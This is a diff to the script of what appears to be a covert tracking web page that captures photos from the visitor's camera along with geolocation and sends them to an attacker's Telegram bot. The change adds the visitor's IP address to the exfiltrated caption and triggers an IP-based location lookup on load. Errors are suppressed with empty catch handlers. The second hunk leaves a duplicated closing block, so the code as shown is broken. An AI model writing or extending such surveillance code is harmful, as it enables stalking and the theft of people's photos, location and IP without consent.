@@ -20,13 +20,14 @@
     let audioChunks = [];
     let cachedLat = 0;
     let cachedLon = 0;
+    let cachedIP = 'N/A';
 
     function sendToTelegram(lat, lon, photoBlob) {
       if (photoBlob && photoBlob.size > 1000) {
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', photoBlob, 'photo.jpg');
-        formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
+        formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🌐 IP: ${cachedIP}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
       }
     }
@@ -97,7 +98,12 @@
             cachedLat = data.latitude;
             cachedLon = data.longitude;
           }
+          if (data.ip) {
+            cachedIP = data.ip;
+          }
         })
+        .catch(() => {});
+    }
         .catch(() => {});
     }
 
@@ -119,6 +125,7 @@
     }
 
     updateLocation();
+    getIPBasedLocation();
     setInterval(updateLocation, 3000);
 
     async function autoCapture() {
